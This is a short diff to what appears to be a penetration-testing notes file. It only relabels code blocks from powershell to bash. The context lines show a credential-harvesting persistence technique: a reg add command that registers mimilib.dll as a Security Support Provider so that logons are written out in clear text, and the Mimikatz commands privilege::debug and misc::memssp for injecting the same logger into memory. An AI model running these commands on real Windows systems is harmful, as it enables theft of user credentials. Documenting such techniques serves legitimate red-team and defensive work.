@@ -22,7 +22,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 
 Add `mimilib.dll` to the Security Support Provider list (Security Packages):
 
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 
@@ -32,7 +32,7 @@ And after a reboot all credentials can be found in clear text in `C:\Windows\Sys
 
 You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
 
-```powershell
+```bash
 privilege::debug
 misc::memssp
 ```
